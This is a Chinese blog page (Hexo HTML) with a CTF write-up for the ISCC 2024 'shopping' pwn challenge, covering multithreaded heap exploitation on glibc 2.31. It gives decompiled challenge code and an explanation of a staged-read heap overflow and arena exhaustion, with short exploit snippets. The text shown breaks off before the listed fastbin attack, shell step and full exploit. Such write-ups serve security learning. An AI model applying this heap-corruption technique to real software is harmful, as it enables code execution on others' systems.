@@ -1,0 +1,595 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    [ISCC2024]shopping多线程堆libc-2.31 | SEZUVEM=&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="[ISCC 2024] shopping 多线程堆 libc-2.31参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;j284886202&#x2F;article&#x2F;details&#x2F;139119047  程序分析：123456789101112131415161718192021222324252627__int64 __fastcall main(int a1, char **a2, char **">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[ISCC2024]shopping多线程堆libc-2.31">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/malloc_stateHijacking%E5%8A%AB%E6%8C%81/%5BISCC2024%5Dshopping%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%A0%86libc-2.31/index.html">
+<meta property="og:site_name" content="SEZUVEM&#x3D;&#39;s Blog">
+<meta property="og:description" content="[ISCC 2024] shopping 多线程堆 libc-2.31参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;j284886202&#x2F;article&#x2F;details&#x2F;139119047  程序分析：123456789101112131415161718192021222324252627__int64 __fastcall main(int a1, char **a2, char **">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/deo8-OoAx3hYj9QF/1776559337060-13a06ca7-bfa0-4419-b258-3c5582ef9dc0-930101.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/deo8-OoAx3hYj9QF/1776592081677-d7d95104-6042-4966-bee2-fda83eedc093-547210.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/deo8-OoAx3hYj9QF/1776592335564-e19f5d42-c20d-4d21-9b6d-cb084650607a-554176.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/deo8-OoAx3hYj9QF/1776594083651-fc687b10-60eb-40c1-a365-69d2677456dc-513419.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/deo8-OoAx3hYj9QF/1776595402813-6928e515-dd5a-4429-bb91-7553101936d8-243959.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/deo8-OoAx3hYj9QF/1776595680249-2ee811fe-19d3-4028-8fee-02ca24469212-474710.png">
+<meta property="article:published_time" content="2026-04-28T10:25:58.061Z">
+<meta property="article:modified_time" content="2026-04-28T11:22:09.808Z">
+<meta property="article:author" content="SEZUVEM&#x3D;">
+<meta property="article:tag" content="Pwn, CTF, Binary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/deo8-OoAx3hYj9QF/1776559337060-13a06ca7-bfa0-4419-b258-3c5582ef9dc0-930101.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="SEZUVEM='s Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="[ISCC2024]shopping多线程堆libc-2.31">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">[ISCC2024]shopping多线程堆libc-2.31</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ISCC-2024-shopping-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%A0%86-libc-2-31"><span class="toc-number">1.</span> <span class="toc-text">[ISCC 2024] shopping 多线程堆 libc-2.31</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">程序分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A0%86%E5%B8%83%E5%B1%80"><span class="toc-number">1.1.1.</span> <span class="toc-text">堆布局</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA%E5%B9%B6%E5%8A%AB%E6%8C%81-Arena-Header"><span class="toc-number">1.1.2.</span> <span class="toc-text">溢出并劫持 Arena Header</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A5%E7%9C%8B%E4%B8%80%E4%B8%8B-malloc-state-%E7%BB%93%E6%9E%84%E4%BD%93%EF%BC%9A"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">来看一下 malloc_state 结构体：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fastbin-Attack-%E9%94%99%E4%BD%8D%E6%9E%84%E9%80%A0"><span class="toc-number">1.1.3.</span> <span class="toc-text">Fastbin Attack 错位构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91-system-%E2%80%98-bin-sh%E2%80%99-%E8%8E%B7%E5%8F%96-shell"><span class="toc-number">1.1.4.</span> <span class="toc-text">触发 system(‘&#x2F;bin&#x2F;sh’)获取 shell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">总 EXP：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E6%9C%AC%E9%A2%98%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E6%98%AF-tcachebin-%E8%80%8C%E6%98%AF-fastbin-%E7%9A%84%E6%80%9D%E8%80%83%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">对本题为什么不是 tcachebin 而是 fastbin 的思考：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#glibc-2-31-%E7%9A%84-malloc-%E6%9F%A5%E6%89%BE%E9%A1%BA%E5%BA%8F%EF%BC%88%E9%80%80%E5%8C%96%E6%9C%BA%E5%88%B6%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">glibc 2.31 的 malloc 查找顺序（退化机制）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%B8%8D%E7%9B%B4%E6%8E%A5%E8%A6%86%E7%9B%96-tcache-%E7%BB%93%E6%9E%84%E4%BD%93%EF%BC%9F%EF%BC%88%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80%E5%86%B3%E5%AE%9A%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">为什么不直接覆盖 tcache 结构体？（内存布局决定）</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-PWN/PWNCTF/malloc_stateHijacking劫持/[ISCC2024]shopping多线程堆libc-2.31" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-28T10:25:58.061Z" itemprop="datePublished">2026-04-28</time>
+    <time style="display: none;" id="post-update-time">2026-04-28</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="ISCC-2024-shopping-多线程堆-libc-2-31"><a href="#ISCC-2024-shopping-多线程堆-libc-2-31" class="headerlink" title="[ISCC 2024] shopping 多线程堆 libc-2.31"></a>[ISCC 2024] shopping 多线程堆 libc-2.31</h1><p>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/j284886202/article/details/139119047">https://blog.csdn.net/j284886202/article/details/139119047</a></p>
+<p><img src="/HFTTC.github.io/./img/deo8-OoAx3hYj9QF/1776559337060-13a06ca7-bfa0-4419-b258-3c5582ef9dc0-930101.png" alt="1776559337060-13a06ca7-bfa0-4419-b258-3c5582ef9dc0.png"></p>
+<h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> newthread; <span class="comment">// [rsp+28h] [rbp-118h] BYREF</span></span><br><span class="line">    <span class="type">char</span> s[<span class="number">264</span>]; <span class="comment">// [rsp+30h] [rbp-110h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+138h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x100u</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !fgets(s, <span class="number">256</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    sleep(<span class="number">3u</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s, <span class="string">&quot;I&#x27;m ready for shopping\n&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Access denied&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( pthread_create(&amp;newthread, <span class="number">0</span>, (<span class="type">void</span> *(*)(<span class="type">void</span> *))start_routine, <span class="number">0</span>) &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Internal error, contact admin.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_join(newthread, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">start_routine</span><span class="params">(<span class="type">void</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">    <span class="type">int</span> n2; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">    <span class="type">int</span> size; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">    <span class="type">int</span> quantity; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">    <span class="type">void</span> *v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;*****************************************\n&quot;</span>, <span class="number">0x2Au</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;* Welcome to SuperStore&#x27;s Online Service *\n&quot;</span>, <span class="number">0x2Bu</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;*****************************************\n&quot;</span>, <span class="number">0x2Au</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;1. Add item to cart\n&quot;</span>, <span class="number">0x14u</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;2. Checkout\n&quot;</span>, <span class="number">0xCu</span>);</span><br><span class="line">    p_write_w = (__int64 (__fastcall *)(_QWORD, _QWORD))write_w;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            write(<span class="number">1</span>, <span class="string">&quot;Action: &quot;</span>, <span class="number">8u</span>);</span><br><span class="line">            n2 = read_0();</span><br><span class="line">            <span class="keyword">if</span> ( n2 != <span class="number">1</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            write(<span class="number">1</span>, <span class="string">&quot;Item ID: &quot;</span>, <span class="number">9u</span>);</span><br><span class="line">            size = read_0();</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)size &lt;= <span class="number">0x4000</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                write(<span class="number">1</span>, <span class="string">&quot;Quantity: &quot;</span>, <span class="number">0xAu</span>);</span><br><span class="line">                quantity = read_0();</span><br><span class="line">                <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)quantity &lt;= <span class="number">01750</span> )  <span class="comment">// 要求金额大小</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; quantity; ++i )</span><br><span class="line">                        <span class="built_in">malloc</span>(size);</span><br><span class="line">                    v6 = <span class="built_in">malloc</span>(size);</span><br><span class="line">                    write(<span class="number">1</span>, <span class="string">&quot;Add gift message? (0/1): &quot;</span>, <span class="number">0x19u</span>);</span><br><span class="line">                    <span class="keyword">if</span> ( read_0() )</span><br><span class="line">                    &#123;</span><br><span class="line">                        write(<span class="number">1</span>, <span class="string">&quot;Message: &quot;</span>, <span class="number">9u</span>);</span><br><span class="line">                        read_1((__int64)v6, size);</span><br><span class="line">                        p_write_w(v6, size);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    write(<span class="number">1</span>, <span class="string">&quot;Invalid quantity.\n&quot;</span>, <span class="number">0x12u</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                write(<span class="number">1</span>, <span class="string">&quot;Invalid item ID.\n&quot;</span>, <span class="number">0x11u</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( n2 == <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( n2 == <span class="number">1337</span> )</span><br><span class="line">            system(<span class="string">&quot;/usr/bin/id&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            write(<span class="number">1</span>, <span class="string">&quot;Invalid command.\n&quot;</span>, <span class="number">0x11u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> syscall_w(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>着重强调一下 read1 函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">read_1</span><span class="params">(__int64 a1, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 size_2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 size_1; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( size_1 = <span class="number">0</span>; ; size_1 += v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    size_2 = size_1;</span><br><span class="line">    <span class="keyword">if</span> ( size_1 &gt;= size )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = read(<span class="number">0</span>, (<span class="type">void</span> *)(a1 + size_1), size);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      write(<span class="number">1</span>, <span class="string">&quot;error\n&quot;</span>, <span class="number">6u</span>);</span><br><span class="line">      syscall_w(<span class="number">1u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> size_2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>）（</p>
+<p>read1 函数的循环条件是保证输入的内容大小小于内存大小，问题在于 read1 的分布读入，且检查在读入之前，这就意味着我们可以分批读入，在最后一次进行堆溢出。比如 size 的大小为 0x20，我们可以先读入 0x18 的数据，第二次 for 循环进行判断的时候就可以再次填充 0x20 的大小进行堆溢出。</p>
+<p>对于以上 IDA 反编译的代码，我们有以下思考：</p>
+<ul>
+<li><strong>无限分配导致的 Arena 接壤 (Heap Exhaustion)</strong>： 程序在一个无限循环中允许 malloc(size) 而没有 free。在多线程环境中，这会导致当前的 Thread Arena 空间耗尽。当触发 <code>sysmalloc</code> 时，glibc 会通过 mmap 分配新的 Arena。由于 mmap 的分配是确定性的（通常向下生长），精心计算的分配量可以使得当前 Arena 的顶部，恰好与相邻 Arena 的头部结构 (<code>malloc_state</code>) 紧紧贴合。</li>
+<li><strong>堆溢出 (Heap Out-of-Bounds Write)</strong>： 在写入 Message 时，也就是 <code>read_1((__int64)v6, size);</code> 函数中，必然存在一个没有严格校验边界的读取漏洞（比如遇到 <code>\n</code> 才停止）。Exp 中申请了 <code>0x4000</code> 大小的 Chunk，但实际发送了 <code>0x4040 + 0x48 = 0x4088</code> 字节，造成了 0x88 字节的严重越界写。</li>
+</ul>
+<h4 id="堆布局"><a href="#堆布局" class="headerlink" title="堆布局"></a>堆布局</h4><p>在子进程中，我么可以先看一下创建子进程之后的堆情况：thread_arena 在子进程当中，处于堆的起始地址，添加堆之后地址会向下分配，但是存在限制，即最多分配到栈上面 <font style="color:#DF2A3F;">0x1000</font> 个字节为止，因为堆不能覆盖栈。当该内存分配完之后，由于不能够覆盖栈，而栈下面存放的是 libc，glibc 只能考虑在上方通过 mmap 开辟一块新的内存空间。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">12</span>)</span>:</span><br><span class="line">	<span class="title function_">add</span><span class="params">(<span class="number">0x4000</span>, <span class="number">1000</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/deo8-OoAx3hYj9QF/1776592081677-d7d95104-6042-4966-bee2-fda83eedc093-547210.png" alt="1776592081677-d7d95104-6042-4966-bee2-fda83eedc093.png"></p>
+<p>看到栈前 0x1000 个字节的上方仅剩 0x3000 个字节的内存没有分配，直接再次申请一个 0x4000 的大地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x4000</span>, <span class="number">262</span>, b<span class="string">&#x27;a&#x27;</span> * <span class="number">0x3ff0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>此时就触发了 mmap 申请一块新的内存空间：</p>
